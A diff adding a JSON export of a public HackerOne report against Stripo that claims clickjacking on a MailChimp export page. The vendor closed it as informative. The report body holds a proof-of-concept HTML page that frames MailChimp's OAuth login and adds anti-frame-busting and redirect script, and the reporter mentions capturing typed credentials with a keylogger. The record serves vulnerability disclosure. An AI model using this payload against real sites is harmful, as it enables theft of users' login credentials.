@@ -1,0 +1,289 @@
+{
+    "id": 737625,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mzc2MjU=",
+    "url": "https://hackerone.com/reports/737625",
+    "title": "Clickjacking on my.stripo.email for MailChimp credentials ",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "medium",
+    "readable_substate": "Informative",
+    "created_at": "2019-11-14T19:41:04.154Z",
+    "submitted_at": "2019-11-14T19:41:04.154Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "jasongardner",
+        "url": "/jasongardner",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/fKf7KUVcLKshpwRdBUGgHR8Z/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 42368,
+        "url": "https://hackerone.com/stripo",
+        "handle": "stripo",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Stripo Inc",
+            "twitter_handle": "",
+            "website": "https://stripo.email",
+            "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2020-01-08T08:55:51.475Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-01-07T07:52:52.742Z",
+    "team_member_agreed_on_going_public_at": "2020-01-08T08:55:51.179Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Clickjacking is a malicious hacking technique where attackers can acquire sensitive data.\n\nThrough simple social engineering techniques these links can be sent out to unsuspecting customers to steal their credentials or perform actions on their accounts.\n\nFor this example I saw that where I goto export to MailChimp that page is vulnerable to clickjacking and it is a page where the user enters a username and password which would grant me whatever access that user has if I just feed the data from a keylogger on the HTML into another page with tables to store the info.\n\nHere is the HTML code I have embedded on my sites.google.com link:\n\n<html>\n<head>\n<title>Clickjack test page</title>\n</head>\n<body>\n<p>When you enter your e-mail and login here it will be captured and the attacker can now gain access to your customer e-mail lists</p>\n\t\n<iframe src= \"https://login.mailchimp.com/oauth2/authorize?response_type=code&client_id=350877244304&redirect_uri=https%3A%2F%2Fmy.stripo.email%2Fcabinet%2Fexportservice%2Fv1%2Fmailchimpauth.html%3FaccountId%3D2085372\" width=\"1200\" height=\"2500\"></iframe>\n\n\t<script language=\"JavaScript\" type=\"text/javascript\">\n    //<![CDATA[\n        window.onbeforeunload = function(){\n            return 'Are you sure you want to leave?';\n        };\n    //]]>\nhtml2canvas(document.querySelector(\"#capture\")).then(canvas => {\n    document.body.appendChild(canvas)\n});\n</script>\n\t</body>\n<script>\nvar prevent_bust = 0;\nwindow.onbeforeunload = function() {\nprevent_bust++;\n};\nsetInterval(\nfunction() {\nif (prevent_bust > 0) {\nprevent_bust -= 2;\nwindow.top.location = \"https://sites.google.com/view/jason-gardner-app-dev/xss-test-poc\";\n\n\n}\n}, 1);\n</script>\n\n</html>\n\n## Impact\n\nAn attacker could send out malicious emails to entire customer lists, delete accounts or go in and take whatever billing information exists within the MailChimp account.",
+    "weakness": {
+        "id": 74,
+        "name": "UI Redressing (Clickjacking)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 634619,
+            "file_name": "Screen_Shot_2019-11-14_at_11.36.54_AM.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GyydkuepbagYGZ2vgudsZioV?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-11-14_at_11.36.54_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-11-14_at_11.36.54_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4UQSXQTZ%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072718Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD59ppTHrSDLCThycBLwNdaicdZ1Nkoq794uNUuMYn7HgIgdbodqCaSryZkQSXqlYLEKOLF6hjOoJAqBjNkbysEDsYquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEqs7RshbJVIe6WmQSqPBTBjq5SJ4q2CFU%2FmeAnF%2BkLDSlM1eKfT3AntsXsYewzVdZNknCZoZqHzPbc5FH2N8lZFVGzmpJpr27FRlCsAWaKmgfsL5fGeRGnvBUcZHDi6EAyStUFtqIr1M3TzgrnTfY5UYO0%2FD4ZhH66Ys5%2BbUNhRLZdO0I2ILB5NEU86UrWlx5lS8DVVL73aD3yDBKTkTBXGVadmGL68bex9ULnLYcI1JV7%2Bs0ndoDemjf8hoXwE15JNm42EhtanowcY7MgWhIG2bhovQjjIq3UOJoqNjiT3N6yEzBJjYl6MYD4CzT5kf8c2Fl3Jqs9NOoYHc%2BFR0VgoGJlve6BvF%2FzEl%2FlsQA7yGl5XY47VkmzipXcgUrnCCLLSPNkiOtn%2FgdU2zNCsHbNPc5RcprLVz0lHjvF9PpbUjXnfS0C%2BIYiNGLSi2%2B2UB1ksAJNmIuVo76nQMAof%2FYB0RaR%2BidgmBPHRQjAmwL9favSIq0YOb2c8pIkV7oKTUftSZNzHerEseaUieSzHzqmXMzsQFQ0mZWvjNRe7ls60t%2B0gdLjz2KT6Mbam6yM%2BqORxZRZl10aCqM8D8F4tbi8RDUHeIBeHQMxR92XqNtntoZDgJAf2TshBpZEtk2RIFuNFrE2HuWV4Dxsu2osMeMQDickU%2BEOj7aEN0rgsJp0RQ1MGwvCVdo0ALv6WXD7Vs8KQw8fS%2FFrHAoOOa7uBHf3wIDkbgorgCgxrTO7RVZ1LHN8X9%2BhvLwU9p73SHDE0Dcpk0nQ%2FL%2BYh0yhxTK47QW7yMhNFKCyn0G8LnVisMI443rLrAUs2IqsIJTvgUf7fv1j4wVOfIGnKnAa4DS8gUqfX4N811OkU2PR1uF9GbpH%2B8Q7C80cpn4H5xuSe95AwkZm2pwY6sQHNFeGRCycS9nkZJ%2FuKAu32klfmdKcEXE%2BA89m664jWpbKtk8h0zy%2Fm%2BiefngsNdSqx6QRrNidGzU%2F8rFNfWwFOr8oydpHDYpPU2IvE9IiWkgzRPIJUeU%2FmUqQV7ZojZOSr8Qub%2Fr7DXO6Wnenpy7Dl0MfikGJLyeBmI0JfR6662ud7zrsJdM2G%2Fd1W0OeXc%2BP%2BEUV2NFaDLCnfrz8WazfrSKNcIZOrXFpQBDOUcMr9qME%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4bb773757f25fc6e67f29977dfc077a17fc32b0a320b384e977bae5bf3aa4dff",
+            "file_size": 388752,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 7,
+    "voters": [
+        "0xelkomy",
+        "zimmer75",
+        "queen_of_hearts",
+        "hakmod",
+        "stish834",
+        "prags",
+        "densdo"
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 38702,
+        "asset_type": "URL",
+        "asset_identifier": "my.stripo.email",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 6316922,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hello @jasongardner \nThanks a lot for this report and for your contribution to improving the security of our app.\nI've created a task for our developers to fix this issue asap.\nI will keep you updated on this issue.\n\nRegards,\nStripo team",
+            "automated_response": false,
+            "created_at": "2019-11-15T14:48:56.502Z",
+            "updated_at": "2019-11-15T14:48:56.502Z",
+            "actor": {
+                "username": "artem_nefedov",
+                "cleared": false,
+                "verified": false,
+                "url": "/artem_nefedov",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6336711,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "That sounds great @artem_nefedov \n\nPlease let me know if you have any questions.\n\nBest regards,\n\nJason Gardner",
+            "automated_response": false,
+            "created_at": "2019-11-18T18:28:08.853Z",
+            "updated_at": "2019-11-18T18:28:08.853Z",
+            "actor": {
+                "username": "jasongardner",
+                "cleared": false,
+                "verified": false,
+                "url": "/jasongardner",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fKf7KUVcLKshpwRdBUGgHR8Z/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6558871,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "@jasongardner our developers have checked the reported vulnerability and came with the following:\nthis is vulnerability on the page under the Mailchimp's control, thus we can't fix it form our side.\n\nThank you for your contribution.",
+            "automated_response": false,
+            "created_at": "2019-12-16T11:45:57.958Z",
+            "updated_at": "2019-12-16T11:45:57.958Z",
+            "actor": {
+                "username": "artem_nefedov",
+                "cleared": false,
+                "verified": false,
+                "url": "/artem_nefedov",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6558977,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I will follow up with MailChimp. Are you able to just mark the closed issue as will not fix instead of marked as not valid. Also, can you make this report public?",
+            "automated_response": false,
+            "created_at": "2019-12-16T12:09:40.115Z",
+            "updated_at": "2019-12-16T12:09:40.115Z",
+            "actor": {
+                "username": "jasongardner",
+                "cleared": false,
+                "verified": false,
+                "url": "/jasongardner",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fKf7KUVcLKshpwRdBUGgHR8Z/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6704696,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Can we make this report public. I am starting an infosec blog and am trying to open up my hackerone reports so i can use them to talk about the do's and don'ts of bug hunting.",
+            "automated_response": false,
+            "created_at": "2020-01-07T07:52:52.759Z",
+            "updated_at": "2020-01-07T07:52:52.759Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "jasongardner",
+                "cleared": false,
+                "verified": false,
+                "url": "/jasongardner",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fKf7KUVcLKshpwRdBUGgHR8Z/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6715517,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Hello @jasongardner \n\nSure, we don't mind.",
+            "automated_response": false,
+            "created_at": "2020-01-08T08:55:51.212Z",
+            "updated_at": "2020-01-08T08:55:51.212Z",
+            "actor": {
+                "username": "dkulaksyz",
+                "cleared": false,
+                "verified": false,
+                "url": "/dkulaksyz",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/S3TPxR7pmh7Mxu2XaqmxrKpz/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6715518,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-08T08:55:51.497Z",
+            "updated_at": "2020-01-08T08:55:51.497Z",
+            "actor": {
+                "username": "dkulaksyz",
+                "cleared": false,
+                "verified": false,
+                "url": "/dkulaksyz",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/S3TPxR7pmh7Mxu2XaqmxrKpz/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
